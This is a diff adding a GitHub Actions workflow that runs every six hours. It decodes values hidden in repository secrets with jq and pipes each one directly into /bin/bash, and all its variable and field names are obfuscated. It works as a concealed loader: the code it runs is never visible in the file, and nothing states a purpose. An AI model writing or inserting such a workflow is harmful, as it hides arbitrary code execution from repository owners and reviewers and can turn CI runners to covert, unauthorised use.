@@ -1,0 +1,23 @@
+name: shovelbubbly
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shovelbubbly
+        env:
+          o8846: ${{ secrets.o8846 }}
+        run: |
+          echo $o8846 | jq -r .v35893 | /bin/bash
+          echo $lbplf1153 | jq -r .ta95899 | /bin/bash
+          echo $ohs4 | jq -r .g28194 | /bin/bash
+          echo $b7111 | jq -r .zn06 | /bin/bash
+          echo $stbsm7 | jq -r .nhgct646 | /bin/bash
+          echo $h231 | jq -r .mdmpv91 | /bin/bash
+
